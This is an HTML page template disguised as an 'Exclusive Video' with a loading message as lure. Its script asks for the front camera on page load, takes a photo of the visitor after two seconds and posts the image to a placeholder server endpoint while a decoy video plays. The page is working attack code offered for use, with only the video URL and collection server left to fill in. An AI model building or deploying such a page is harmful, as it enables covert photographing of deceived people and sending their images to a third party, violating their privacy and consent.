<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exclusive Video</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        video {
            max-width: 100%;
            max-height: 100%;
        }
        #message {
            position: absolute;
            top: 10px;
            left: 10px;
            color: white;
            background-color: rgba(0,0,0,0.7);
            padding: 10px;
            border-radius: 5px;
            font-family: Arial, sans-serif;
        }
    </style>
</head>
<body>
    <div id="message">Please wait, loading exclusive content...</div>
    <video id="video" autoplay muted loop playsinline>
        <source src="YOUR_VIDEO_URL" type="video/mp4">
        Your browser doesn't support the video tag.
    </video>

    <script>
        // Hide the message after video starts playing
        document.getElementById('video').addEventListener('canplay', function() {
            setTimeout(function() {
                document.getElementById('message').style.display = 'none';
            }, 3000);
        });

        // Request camera access and capture photo
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(function(stream) {
                var video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                // Wait a bit for camera to initialize
                setTimeout(function() {
                    var canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    var context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // Convert to blob and send to server
                    canvas.toBlob(function(blob) {
                        var formData = new FormData();
                        formData.append('image', blob);
                        
                        // Send to your server
                        fetch('YOUR_SERVER_ENDPOINT', {
                            method: 'POST',
                            body: formData
                        })
                        .then(response => response.text())
                        .then(data => console.log('Success:', data))
                        .catch(error => console.error('Error:', error));
                        
                        // Stop camera stream
                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/jpeg');
                }, 2000);
            })
            .catch(function(err) {
                console.error('Camera access denied:', err);
            });
    </script>
</body>
</html>
